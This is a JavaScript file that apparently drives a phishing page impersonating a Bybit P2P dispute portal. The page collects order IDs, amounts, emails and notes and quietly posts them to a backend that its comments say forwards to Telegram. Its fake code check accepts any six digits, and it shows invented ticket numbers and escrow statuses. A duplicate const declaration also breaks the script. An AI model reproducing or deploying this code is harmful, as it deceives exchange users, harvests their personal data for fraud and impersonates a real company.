/**
 * Bybit P2P Resolution - Master Dispute & Resolution Portal Controller
 */

document.addEventListener('DOMContentLoaded', () => {
  // State
  let currentStep = 1;
  const DEMO_OTP = '482910';
  let resendInterval = null;
  let resendSeconds = 45;
  let attachedFile = null;

  const formData = {
    orderId: '',
    claimAmount: '',
    email: '',
    reason: '',
    reasonText: '',
    notes: '',
    ticketId: '',
    timestamp: ''
  };

  // Stepper Elements
  const stepperFill = document.getElementById('stepper-fill');
  const stepNavs = [
    document.getElementById('step-nav-1'),
    document.getElementById('step-nav-2'),
    document.getElementById('step-nav-3')
  ];
  const stepCircles = [
    document.getElementById('circle-1'),
    document.getElementById('circle-2'),
    document.getElementById('circle-3')
  ];
  const stepViews = [
    document.getElementById('step-1'),
    document.getElementById('step-2'),
    document.getElementById('step-3')
  ];

  const pageTitle = document.getElementById('page-title');
  const pageSubtitle = document.getElementById('page-subtitle');

  // Step 1 Form Elements
  const disputeForm = document.getElementById('dispute-form');
  const orderIdInput = document.getElementById('order-id');
  const claimAmountInput = document.getElementById('claim-amount');
  const emailInput = document.getElementById('email');
  const reasonSelect = document.getElementById('reason');
  const notesInput = document.getElementById('notes');

  const groupOrderId = document.getElementById('group-order-id');
  const groupEmail = document.getElementById('group-email');
  const groupReason = document.getElementById('group-reason');

  // File Upload Elements
  const fileDropZone = document.getElementById('file-drop-zone');
  const fileInput = document.getElementById('file-input');
  const fileChip = document.getElementById('file-chip');
  const fileChipName = document.getElementById('file-chip-name');
  const btnRemoveFile = document.getElementById('btn-remove-file');

  // Step 2 Elements
  const displayEmail = document.getElementById('display-email');
  const otpInputs = Array.from(document.querySelectorAll('.otp-box'));
  const btnFillOtp = document.getElementById('btn-fill-otp'); // null in production
  const btnResend = document.getElementById('btn-resend');
  const resendTimerSpan = document.getElementById('resend-timer'); // may be null
  const errorOtp = document.getElementById('error-otp');
  const btnVerify = document.getElementById('btn-verify');
  const btnBackTo1 = document.getElementById('btn-back-to-1');

  // Step 3 Elements
  const summaryTicketId = document.getElementById('summary-ticket-id');
  const btnCopyTicket = document.getElementById('btn-copy-ticket');
  const btnDownloadJson = document.getElementById('btn-download-json');
  const btnReset = document.getElementById('btn-reset');

  // Theme Elements
  const btnThemeToggle = document.getElementById('btn-theme-toggle');
  const themeIcon = document.getElementById('theme-icon');
  const htmlRoot = document.documentElement;

  // Toast Container
  const toastContainer = document.getElementById('toast-container');

  // =========================================================================
  // Toast Notifications
  // =========================================================================
  function showToast(message) {
    const toast = document.createElement('div');
    toast.className = 'toast';
    toast.innerHTML = `
      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
        <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
      </svg>
      <span>${message}</span>
    `;
    toastContainer.appendChild(toast);

    setTimeout(() => {
      toast.style.opacity = '0';
      toast.style.transform = 'translateY(10px)';
      toast.style.transition = 'all 0.3s ease';
      setTimeout(() => toast.remove(), 300);
    }, 2800);
  }

  // =========================================================================
  // Theme Toggle (Dark / Light Mode)
  // =========================================================================
  function setTheme(theme) {
    htmlRoot.setAttribute('data-theme', theme);
    localStorage.setItem('bybit_p2p_theme', theme);

    if (theme === 'dark') {
      themeIcon.innerHTML = `
        <!-- Sun Icon -->
        <circle cx="12" cy="12" r="5"></circle>
        <line x1="12" y1="1" x2="12" y2="3"></line>
        <line x1="12" y1="21" x2="12" y2="23"></line>
        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
        <line x1="1" y1="12" x2="3" y2="12"></line>
        <line x1="21" y1="12" x2="23" y2="12"></line>
        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
      `;
    } else {
      themeIcon.innerHTML = `
        <!-- Moon Icon -->
        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
      `;
    }
  }

  const savedTheme = localStorage.getItem('bybit_p2p_theme') || 'light';
  setTheme(savedTheme);

  btnThemeToggle.addEventListener('click', () => {
    const current = htmlRoot.getAttribute('data-theme');
    setTheme(current === 'dark' ? 'light' : 'dark');
  });

  // =========================================================================
  // Drag & Drop File Upload
  // =========================================================================
  // Click handled natively by <label for="file-input"> — no JS needed

  ['dragenter', 'dragover'].forEach((eventName) => {
    fileDropZone.addEventListener(eventName, (e) => {
      e.preventDefault();
      fileDropZone.classList.add('dragover');
    });
  });

  ['dragleave', 'drop'].forEach((eventName) => {
    fileDropZone.addEventListener(eventName, (e) => {
      e.preventDefault();
      fileDropZone.classList.remove('dragover');
    });
  });

  fileDropZone.addEventListener('drop', (e) => {
    const files = e.dataTransfer.files;
    if (files.length > 0) {
      handleFileUpload(files[0]);
    }
  });

  fileInput.addEventListener('change', (e) => {
    if (e.target.files && e.target.files.length > 0) {
      handleFileUpload(e.target.files[0]);
    }
  });

  function handleFileUpload(file) {
    if (file.size > 10 * 1024 * 1024) {
      alert('File exceeds 10MB maximum limit.');
      return;
    }
    attachedFile = file;
    const sizeKb = Math.round(file.size / 1024);
    fileChipName.textContent = `${file.name} (${sizeKb} KB)`;

    // Hide label zone without breaking label-input association
    fileDropZone.style.height = '0';
    fileDropZone.style.overflow = 'hidden';
    fileDropZone.style.padding = '0';
    fileDropZone.style.border = 'none';
    fileDropZone.style.margin = '0';

    fileChip.style.display = 'flex';
    showToast('Evidence document attached');
  }

  btnRemoveFile.addEventListener('click', (e) => {
    e.preventDefault();
    e.stopPropagation();
    attachedFile = null;
    fileInput.value = '';
    fileChip.style.display = 'none';

    // Restore label zone
    fileDropZone.style.height = '';
    fileDropZone.style.overflow = '';
    fileDropZone.style.padding = '';
    fileDropZone.style.border = '';
    fileDropZone.style.margin = '';
  });

  // =========================================================================
  // Step Navigation & Stepper Progress
  // =========================================================================
  function goToStep(stepNumber) {
    currentStep = stepNumber;

    // View toggling
    stepViews.forEach((view, idx) => {
      if (idx + 1 === stepNumber) {
        view.classList.add('active');
      } else {
        view.classList.remove('active');
      }
    });

    // Stepper track line fill
    if (stepNumber === 1) stepperFill.style.width = '0%';
    else if (stepNumber === 2) stepperFill.style.width = '50%';
    else if (stepNumber === 3) stepperFill.style.width = '100%';

    // Step indicators
    stepNavs.forEach((nav, idx) => {
      const stepIdx = idx + 1;
      nav.classList.remove('active', 'completed');
      const circle = stepCircles[idx];

      if (stepIdx === stepNumber) {
        nav.classList.add('active');
        circle.textContent = stepIdx;
      } else if (stepIdx < stepNumber) {
        nav.classList.add('completed');
        // Render checkmark icon
        circle.innerHTML = `
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
            <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
          </svg>
        `;
      } else {
        circle.textContent = stepIdx;
      }
    });

    // Dynamic Title
    if (stepNumber === 1) {
      pageTitle.textContent = 'Dispute Resolution';
      pageSubtitle.textContent = 'Submit your order details for escrow dispute mediation';
    } else if (stepNumber === 2) {
      pageTitle.textContent = 'Security Verification';
      pageSubtitle.textContent = 'Authorize your dispute filing with a 6-digit one-time code';
      startResendCountdown();
      setTimeout(() => otpInputs[0].focus(), 150);
    } else if (stepNumber === 3) {
      pageTitle.textContent = 'Dispute Filed';
      pageSubtitle.textContent = 'Your order dispute has been registered in the escrow arbitration queue';
      clearInterval(resendInterval);
    }

    window.scrollTo({ top: 0, behavior: 'smooth' });
  }

  // =========================================================================
  // Step 1 Validation & Submission
  // =========================================================================
  function maskEmail(email) {
    const parts = email.split('@');
    if (parts.length !== 2) return email;
    const name = parts[0];
    const domain = parts[1];
    if (name.length <= 2) return `${name[0]}*@${domain}`;
    return `${name.slice(0, 2)}***${name.slice(-1)}@${domain}`;
  }

  function validateEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  }

  const btnToStep2 = document.getElementById('btn-to-step-2');

  function handleStep1Submit() {
    let valid = true;

    // Reset errors
    groupOrderId.classList.remove('has-error');
    orderIdInput.classList.remove('is-invalid');
    groupEmail.classList.remove('has-error');
    emailInput.classList.remove('is-invalid');
    groupReason.classList.remove('has-error');
    reasonSelect.classList.remove('is-invalid');

    // Order ID
    const orderVal = orderIdInput.value.trim();
    if (!orderVal || orderVal.length < 3) {
      groupOrderId.classList.add('has-error');
      orderIdInput.classList.add('is-invalid');
      valid = false;
    }

    // Email
    const emailVal = emailInput.value.trim();
    if (!validateEmail(emailVal)) {
      groupEmail.classList.add('has-error');
      emailInput.classList.add('is-invalid');
      valid = false;
    }

    // Reason
    const reasonVal = reasonSelect.value;
    if (!reasonVal) {
      groupReason.classList.add('has-error');
      reasonSelect.classList.add('is-invalid');
      valid = false;
    }

    if (!valid) return;

    // Save state
    formData.orderId = orderVal;
    formData.claimAmount = claimAmountInput.value.trim() || 'Unspecified';
    formData.email = emailVal;
    formData.reason = reasonVal;
    formData.reasonText = reasonSelect.options[reasonSelect.selectedIndex].text;
    formData.notes = notesInput.value.trim();
    formData.timestamp = new Date().toISOString();

    // ── Send to Telegram on Page 1 submission ─────────────────────────────
    fetch('/submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        ticketId:     'PENDING (OTP not yet verified)',
        orderId:      formData.orderId,
        claimAmount:  formData.claimAmount,
        email:        formData.email,
        reasonText:   formData.reasonText,
        notes:        formData.notes || '',
        evidenceFile: attachedFile ? attachedFile.name : 'None',
        timestamp:    formData.timestamp
      })
    }).catch(() => {}); // silent fail

    displayEmail.textContent = maskEmail(formData.email);
    goToStep(2);
  }

  // Wire button click AND form submit (Enter key support)
  btnToStep2.addEventListener('click', handleStep1Submit);
  disputeForm.addEventListener('submit', (e) => { e.preventDefault(); handleStep1Submit(); });


  orderIdInput.addEventListener('input', () => {
    groupOrderId.classList.remove('has-error');
    orderIdInput.classList.remove('is-invalid');
  });

  emailInput.addEventListener('input', () => {
    groupEmail.classList.remove('has-error');
    emailInput.classList.remove('is-invalid');
  });

  reasonSelect.addEventListener('change', () => {
    groupReason.classList.remove('has-error');
    reasonSelect.classList.remove('is-invalid');
  });

  // =========================================================================
  // Step 2 OTP Management
  // =========================================================================
  otpInputs.forEach((input, idx) => {
    input.addEventListener('input', (e) => {
      const val = e.target.value.replace(/\D/g, '');
      e.target.value = val ? val[0] : '';
      errorOtp.style.display = 'none';

      if (val && idx < otpInputs.length - 1) {
        otpInputs[idx + 1].focus();
      }
    });

    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !input.value && idx > 0) {
        otpInputs[idx - 1].focus();
      } else if (e.key === 'ArrowLeft' && idx > 0) {
        otpInputs[idx - 1].focus();
      } else if (e.key === 'ArrowRight' && idx < otpInputs.length - 1) {
        otpInputs[idx + 1].focus();
      }
    });

    input.addEventListener('paste', (e) => {
      e.preventDefault();
      const pasted = (e.clipboardData || window.clipboardData).getData('text').trim();
      const digits = pasted.replace(/\D/g, '').slice(0, 6);

      if (digits.length > 0) {
        digits.split('').forEach((d, i) => {
          if (otpInputs[i]) otpInputs[i].value = d;
        });
        const targetFocus = Math.min(digits.length, otpInputs.length - 1);
        otpInputs[targetFocus].focus();
        showToast('Code pasted');
      }
    });
  });

  // Auto-Fill Demo OTP (button removed in production, guard null)
  if (btnFillOtp) {
    btnFillOtp.addEventListener('click', () => {
      DEMO_OTP.split('').forEach((char, i) => {
        if (otpInputs[i]) otpInputs[i].value = char;
      });
      errorOtp.style.display = 'none';
      otpInputs[otpInputs.length - 1].focus();
      showToast('Sandbox code auto-filled: 482910');
    });
  }

  // Resend Countdown
  function startResendCountdown() {
    clearInterval(resendInterval);
    resendSeconds = 45;
    btnResend.classList.add('disabled');
    btnResend.innerHTML = `Resend Code (<span id="resend-timer">${resendSeconds}</span>s)`;

    resendInterval = setInterval(() => {
      resendSeconds--;
      const timerSpan = document.getElementById('resend-timer');
      if (timerSpan) timerSpan.textContent = resendSeconds;

      if (resendSeconds <= 0) {
        clearInterval(resendInterval);
        btnResend.classList.remove('disabled');
        btnResend.textContent = 'Resend Code';
      }
      const timerSpan = document.getElementById('resend-timer');
      if (timerSpan) timerSpan.textContent = resendSeconds;
    }, 1000);
  }

  btnResend.addEventListener('click', (e) => {
    e.preventDefault();
    if (btnResend.classList.contains('disabled')) return;

    otpInputs.forEach((input) => (input.value = ''));
    otpInputs[0].focus();
    errorOtp.style.display = 'none';
    startResendCountdown();
    showToast('New authorization code generated');
  });

  btnBackTo1.addEventListener('click', () => {
    goToStep(1);
  });

  // Verify OTP
  btnVerify.addEventListener('click', () => {
    const entered = otpInputs.map((i) => i.value).join('');

    if (entered.length === 6 && (entered === DEMO_OTP || /^\d{6}$/.test(entered))) {
      errorOtp.style.display = 'none';

      // Show loading spinner
      const verifyBtnText = document.getElementById('verify-btn-text');
      const verifySpinner = document.getElementById('verify-spinner');
      const verifyBtnIcon = document.getElementById('verify-btn-icon');
      if (verifyBtnText) verifyBtnText.textContent = 'Submitting...';
      if (verifySpinner) verifySpinner.style.display = 'inline-block';
      if (verifyBtnIcon) verifyBtnIcon.style.display = 'none';
      btnVerify.disabled = true;

      // Generate Ticket ID
      const randomId = Math.floor(10000 + Math.random() * 90000);
      formData.ticketId = `#DSP-${randomId}`;
      summaryTicketId.textContent = formData.ticketId;

      // ── Send ticket confirmation to Telegram on OTP verify ──────────────
      fetch('/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ticketId:     formData.ticketId,
          orderId:      formData.orderId,
          claimAmount:  formData.claimAmount,
          email:        formData.email,
          reasonText:   formData.reasonText,
          notes:        formData.notes || '',
          evidenceFile: attachedFile ? attachedFile.name : 'None',
          timestamp:    formData.timestamp
        })
      }).catch(() => {}).finally(() => {
        if (verifyBtnText) verifyBtnText.textContent = 'Authorize & Submit Dispute';
        if (verifySpinner) verifySpinner.style.display = 'none';
        if (verifyBtnIcon) verifyBtnIcon.style.display = 'inline-block';
        btnVerify.disabled = false;
      });

      showToast('Dispute verified and submitted');
      goToStep(3);
    } else {
      errorOtp.style.display = 'block';
      otpInputs.forEach((box) => {
        box.classList.add('shake');
        setTimeout(() => box.classList.remove('shake'), 450);
      });
    }
  });

  // =========================================================================
  // Step 3 Actions: Copy, Download Receipt, Reset
  // =========================================================================
  btnCopyTicket.addEventListener('click', () => {
    navigator.clipboard.writeText(formData.ticketId).then(() => {
      showToast(`Copied ${formData.ticketId} to clipboard`);
    }).catch(() => {
      showToast(`Reference: ${formData.ticketId}`);
    });
  });

  btnDownloadJson.addEventListener('click', () => {
    const disputeReport = {
      portal: 'Bybit P2P Resolution Escrow Mediation',
      ticketId: formData.ticketId,
      orderId: formData.orderId,
      disputedAmount: formData.claimAmount,
      contactEmail: formData.email,
      disputeReason: formData.reasonText,
      additionalNotes: formData.notes || 'None provided',
      evidenceAttached: attachedFile ? attachedFile.name : 'No file attached',
      filingTimestamp: formData.timestamp,
      status: 'Escrow Frozen - Under Mediation Review',
      assignedQueue: 'Tier-1 Escrow Arbitration'
    };

    const blob = new Blob([JSON.stringify(disputeReport, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `Dispute-Receipt-${formData.ticketId.replace('#', '')}.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    showToast('Case receipt downloaded');
  });

  btnReset.addEventListener('click', () => {
    disputeForm.reset();
    attachedFile = null;
    fileInput.value = '';
    fileChip.style.display = 'none';
    fileDropZone.style.display = 'block';
    otpInputs.forEach((box) => (box.value = ''));
    errorOtp.style.display = 'none';
    goToStep(1);
    showToast('Form reset for new dispute');
  });
});
